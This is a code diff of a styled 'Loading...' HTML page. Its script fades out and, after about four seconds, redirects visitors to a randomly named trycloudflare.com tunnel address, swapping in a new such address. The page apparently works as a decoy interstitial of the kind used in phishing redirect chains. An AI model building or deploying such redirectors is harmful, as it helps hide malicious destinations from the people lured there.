@@ -3,70 +3,115 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0">
-  <title>Waiting...</title>
+  <title>Loading...</title>
   <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/189/189792.png" />
   <style>
+    /* Dark/Light Mode Support */
     body {
-      background: #181818;
-      color: #e9e6e1;
       margin: 0;
       height: 100vh;
-      overflow: hidden;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       font-family: 'Segoe UI', 'Arial', sans-serif;
-      animation: fadeIn 1s;
+      transition: all 0.8s ease;
+      opacity: 1;
+      backdrop-filter: blur(10px);
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0;}
-      to { opacity: 1;}
+    /* Dark mode */
+    @media (prefers-color-scheme: dark) {
+      body {
+        background: #181818;
+        color: #e3c98a;
+      }
+    }
+
+    /* Light mode */
+    @media (prefers-color-scheme: light) {
+      body {
+        background: rgba(255,255,255,0.7);
+        color: #333;
+      }
     }
 
     h1 {
       font-size: 2rem;
       margin-bottom: 40px;
-      color: #e3c98a;
+      display: flex;
+      gap: 5px;
     }
 
+    /* Animate dots */
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      opacity: 0.3;
+      animation: blink 1s infinite;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      .dot { background: #e3c98a; }
+    }
+
+    @media (prefers-color-scheme: light) {
+      .dot { background: #333; }
+    }
+
+    .dot:nth-child(1) { animation-delay: 0s; }
+    .dot:nth-child(2) { animation-delay: 0.2s; }
+    .dot:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0.3; }
+      40% { opacity: 1; }
+    }
+
+    /* Loader bars */
     .loader {
-      width: 80px;
-      aspect-ratio: 1;
-      --c:#8d7958 98%,#0000;
-      background:
-        radial-gradient(50% 70% at 50% 120%, var(--c)) top,
-        radial-gradient(70% 50% at -20% 50%, var(--c)) right,
-        radial-gradient(50% 70% at 50% -20%, var(--c)) bottom,
-        radial-gradient(70% 50% at 120% 50%, var(--c)) left;
-      background-size: 100% 50.1%,50.1% 100%;
+      width: 85px;
+      height: 50px;
+      --g1: conic-gradient(from  90deg at left   3px top   3px,#0000 90deg,#fff 0);
+      --g2: conic-gradient(from -90deg at bottom 3px right 3px,#0000 90deg,#fff 0);
+      background: var(--g1),var(--g1),var(--g1), var(--g2),var(--g2),var(--g2);
+      background-position: left, center, right;
       background-repeat: no-repeat;
-      -webkit-mask: radial-gradient(circle 5px,#0000 90%,#000);
-      animation: spin 1.5s infinite linear;
-      box-shadow: 0 0 40px 10px #8d7958cc, 0 0 0 4px #2e2410 inset;
-      filter: drop-shadow(0 0 12px #8d7958a0);
+      animation: l9 1s infinite;
     }
 
-    @keyframes spin { 
-      100%{transform: rotate(1turn)}
+    @keyframes l9 {
+      0%   {background-size:25px 50% ,25px 50% ,25px 50%}
+      25%  {background-size:25px 100%,25px 50% ,25px 50%}
+      50%  {background-size:25px 50% ,25px 100%,25px 50%}
+      75%  {background-size:25px 50% ,25px 50% ,25px 100%}
+      100% {background-size:25px 50% ,25px 50% ,25px 50%}
     }
 
     @media (max-width: 500px) {
       h1 { font-size: 1.5rem; margin-bottom: 30px; }
-      .loader { width: 50px; }
+      .loader { width: 60px; height: 35px; }
     }
   </style>
 </head>
 <body>
-  <h1>Waiting...</h1>
+  <h1>
+    Loading
+    <span class="dot"></span>
+    <span class="dot"></span>
+    <span class="dot"></span>
+  </h1>
   <div class="loader"></div>
 
   <script>
-    // Redirect after 3.5 seconds
+    // Redirect with fade-out
     setTimeout(() => {
-      window.location.href = "https://korea-however-cup-collection.trycloudflare.com";
-    }, 3500);
+      document.body.style.opacity = '0'; // Start fade-out
+      setTimeout(() => {
+        window.location.href = "https://documents-ships-naples-promotions.trycloudflare.com"; // Redirect after fade
+      }, 800); // fade duration
+    }, 3500); // wait before starting fade
   </script>
 </body>
 </html>
